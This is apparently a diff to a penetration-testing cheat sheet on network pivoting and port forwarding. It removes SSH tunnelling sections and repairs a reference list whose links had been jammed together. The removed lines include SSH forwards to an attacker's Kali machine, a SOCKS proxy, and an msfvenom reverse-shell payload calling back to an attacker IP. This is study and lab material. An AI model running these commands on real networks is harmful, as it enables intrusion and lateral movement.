@@ -19,44 +19,6 @@ portfwd add -l 4445 -p 4443 -r 10.1.1.1
 # Use -R to make it reverse
 ```
 
-### Using SSH
-
-Target: Linux
-
-**If you already have an SSH session**
-
-Single host port forward
-
-```bash
-ssh -R 8081:172.24.0.2:80 # (on my Kali machine listen on 8081, get it from 172.24.0.2:80)
-# <KALI 10.1.1.1>:8081<------------<REMOTE 172.16.0.2>:80
-# Now you can access 172.16.0.2:80, which you didn't have direct access to
-```
-
-Dual host port forward
-
-```bash
-ssh -L 8083:127.0.0.1:8084 # (on your machine listen on 8083, send it to my Kali machine on 8084)
-# <KALI 127.0.0.1>:8084<------------<REMOTE 10.1.1.230>:8083<------------<REMOTE X.X.X.X>:XXXX
-# run nc on port 8084, and if 10.1.1.230:8083 receives a reverse shell, you will get it on kali
-
-#For reverse shell:
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.123 LPORT=8083 -f exe -o shell
-# Run it on 2nd remote target to get a shell on Kali
-```
-
-**If you don't already have an SSH session**
-
-First, SSH to your Kali from target machine
-
-On Kali:
-
-```bash
-service ssh start 
-# "add a user, give it /bin/false in /etc/passwd"
-ssh - -R 12345:192.168.1.212:5986 test@10.10.10.123
-```
-
 ### Using PLINK
 
 Target: Windows
@@ -131,14 +93,6 @@ Target: Most platforms
 * Auto route to IP (multi/manage/autoroute)
 * Start socks proxy (auxiliary/server/socks4a)
 
-### Using SSH
-
-Target: Linux
-
-```
-ssh -i bobs.key -p 2222 bob@10.10.10.123 -D1080
-```
-
 ### Using PLINK
 
 Target: Windows
@@ -197,12 +151,12 @@ More than one pattern may be specified by separating them by commas. An exclamat
 * [https://notes.benheater.com/books/network-pivoting/page/ssh-port-forwarding](https://notes.benheater.com/books/network-pivoting/page/ssh-port-forwarding)
 * [https://iximiuz.com/en/posts/ssh-tunnels/](https://iximiuz.com/en/posts/ssh-tunnels/)
 * [https://ironhackers.es/en/cheatsheet/port-forwarding-cheatsheet/](https://ironhackers.es/en/cheatsheet/port-forwarding-cheatsheet/)
-* [https://github.com/haad/proxychains](https://github.com/haad/proxychainshttps://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.htmlhttps://thegreycorner.com/2021/12/15/hackthebox\_dante-review.htmlhttps://github.com/t3l3machus/pentest-pivotinghttps://serverfault.com/questions/361794/with-ssh-only-reverse-tunnel-web-access-via-ssh-socks-proxyhttps://www.offensive-security.com/metasploit-unleashed/proxytunnels/https://www.cobaltstrike.com/blog/howto-port-forwards-through-a-socks-proxy/https://materials.rangeforce.com/tutorial/2020/03/16/Proxychains/https://medium.com/geekculture/forwarding-burp-suite-traffic-through-socks-proxy-bada1124341c)
-* [https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html](https://github.com/haad/proxychainshttps://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.htmlhttps://thegreycorner.com/2021/12/15/hackthebox\_dante-review.htmlhttps://github.com/t3l3machus/pentest-pivotinghttps://serverfault.com/questions/361794/with-ssh-only-reverse-tunnel-web-access-via-ssh-socks-proxyhttps://www.offensive-security.com/metasploit-unleashed/proxytunnels/https://www.cobaltstrike.com/blog/howto-port-forwards-through-a-socks-proxy/https://materials.rangeforce.com/tutorial/2020/03/16/Proxychains/https://medium.com/geekculture/forwarding-burp-suite-traffic-through-socks-proxy-bada1124341c)
-* [https://thegreycorner.com/2021/12/15/hackthebox\_dante-review.html](https://github.com/haad/proxychainshttps://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.htmlhttps://thegreycorner.com/2021/12/15/hackthebox\_dante-review.htmlhttps://github.com/t3l3machus/pentest-pivotinghttps://serverfault.com/questions/361794/with-ssh-only-reverse-tunnel-web-access-via-ssh-socks-proxyhttps://www.offensive-security.com/metasploit-unleashed/proxytunnels/https://www.cobaltstrike.com/blog/howto-port-forwards-through-a-socks-proxy/https://materials.rangeforce.com/tutorial/2020/03/16/Proxychains/https://medium.com/geekculture/forwarding-burp-suite-traffic-through-socks-proxy-bada1124341c)
-* [https://github.com/t3l3machus/pentest-pivoting](https://github.com/haad/proxychainshttps://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.htmlhttps://thegreycorner.com/2021/12/15/hackthebox\_dante-review.htmlhttps://github.com/t3l3machus/pentest-pivotinghttps://serverfault.com/questions/361794/with-ssh-only-reverse-tunnel-web-access-via-ssh-socks-proxyhttps://www.offensive-security.com/metasploit-unleashed/proxytunnels/https://www.cobaltstrike.com/blog/howto-port-forwards-through-a-socks-proxy/https://materials.rangeforce.com/tutorial/2020/03/16/Proxychains/https://medium.com/geekculture/forwarding-burp-suite-traffic-through-socks-proxy-bada1124341c)
-* [https://serverfault.com/questions/361794/with-ssh-only-reverse-tunnel-web-access-via-ssh-socks-proxy](https://github.com/haad/proxychainshttps://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.htmlhttps://thegreycorner.com/2021/12/15/hackthebox\_dante-review.htmlhttps://github.com/t3l3machus/pentest-pivotinghttps://serverfault.com/questions/361794/with-ssh-only-reverse-tunnel-web-access-via-ssh-socks-proxyhttps://www.offensive-security.com/metasploit-unleashed/proxytunnels/https://www.cobaltstrike.com/blog/howto-port-forwards-through-a-socks-proxy/https://materials.rangeforce.com/tutorial/2020/03/16/Proxychains/https://medium.com/geekculture/forwarding-burp-suite-traffic-through-socks-proxy-bada1124341c)
-* [https://www.offensive-security.com/metasploit-unleashed/proxytunnels/](https://github.com/haad/proxychainshttps://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.htmlhttps://thegreycorner.com/2021/12/15/hackthebox\_dante-review.htmlhttps://github.com/t3l3machus/pentest-pivotinghttps://serverfault.com/questions/361794/with-ssh-only-reverse-tunnel-web-access-via-ssh-socks-proxyhttps://www.offensive-security.com/metasploit-unleashed/proxytunnels/https://www.cobaltstrike.com/blog/howto-port-forwards-through-a-socks-proxy/https://materials.rangeforce.com/tutorial/2020/03/16/Proxychains/https://medium.com/geekculture/forwarding-burp-suite-traffic-through-socks-proxy-bada1124341c)
-* [https://www.cobaltstrike.com/blog/howto-port-forwards-through-a-socks-proxy/](https://github.com/haad/proxychainshttps://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.htmlhttps://thegreycorner.com/2021/12/15/hackthebox\_dante-review.htmlhttps://github.com/t3l3machus/pentest-pivotinghttps://serverfault.com/questions/361794/with-ssh-only-reverse-tunnel-web-access-via-ssh-socks-proxyhttps://www.offensive-security.com/metasploit-unleashed/proxytunnels/https://www.cobaltstrike.com/blog/howto-port-forwards-through-a-socks-proxy/https://materials.rangeforce.com/tutorial/2020/03/16/Proxychains/https://medium.com/geekculture/forwarding-burp-suite-traffic-through-socks-proxy-bada1124341c)
-* [https://materials.rangeforce.com/tutorial/2020/03/16/Proxychains/](https://github.com/haad/proxychainshttps://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.htmlhttps://thegreycorner.com/2021/12/15/hackthebox\_dante-review.htmlhttps://github.com/t3l3machus/pentest-pivotinghttps://serverfault.com/questions/361794/with-ssh-only-reverse-tunnel-web-access-via-ssh-socks-proxyhttps://www.offensive-security.com/metasploit-unleashed/proxytunnels/https://www.cobaltstrike.com/blog/howto-port-forwards-through-a-socks-proxy/https://materials.rangeforce.com/tutorial/2020/03/16/Proxychains/https://medium.com/geekculture/forwarding-burp-suite-traffic-through-socks-proxy-bada1124341c)
-* [https://medium.com/geekculture/forwarding-burp-suite-traffic-through-socks-proxy-bada1124341c](https://github.com/haad/proxychainshttps://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.htmlhttps://thegreycorner.com/2021/12/15/hackthebox\_dante-review.htmlhttps://github.com/t3l3machus/pentest-pivotinghttps://serverfault.com/questions/361794/with-ssh-only-reverse-tunnel-web-access-via-ssh-socks-proxyhttps://www.offensive-security.com/metasploit-unleashed/proxytunnels/https://www.cobaltstrike.com/blog/howto-port-forwards-through-a-socks-proxy/https://materials.rangeforce.com/tutorial/2020/03/16/Proxychains/https://medium.com/geekculture/forwarding-burp-suite-traffic-through-socks-proxy-bada1124341c)
+* [https://github.com/haad/proxychains](https://github.com/haad/proxychains)
+* [https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html](https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html)
+* [https://thegreycorner.com/2021/12/15/hackthebox\_dante-review.html](https://thegreycorner.com/2021/12/15/hackthebox\_dante-review.html)
+* [https://github.com/t3l3machus/pentest-pivoting](https://github.com/t3l3machus/pentest-pivoting)
+* [https://serverfault.com/questions/361794/with-ssh-only-reverse-tunnel-web-access-via-ssh-socks-proxy](https://serverfault.com/questions/361794/with-ssh-only-reverse-tunnel-web-access-via-ssh-socks-proxy)
+* [https://www.offensive-security.com/metasploit-unleashed/proxytunnels/](https://www.offensive-security.com/metasploit-unleashed/proxytunnels/)
+* [https://www.cobaltstrike.com/blog/howto-port-forwards-through-a-socks-proxy/](https://www.cobaltstrike.com/blog/howto-port-forwards-through-a-socks-proxy/)
+* [https://materials.rangeforce.com/tutorial/2020/03/16/Proxychains/](https://materials.rangeforce.com/tutorial/2020/03/16/Proxychains/)
+* [https://medium.com/geekculture/forwarding-burp-suite-traffic-through-socks-proxy-bada1124341c](https://medium.com/geekculture/forwarding-burp-suite-traffic-through-socks-proxy-bada1124341c)
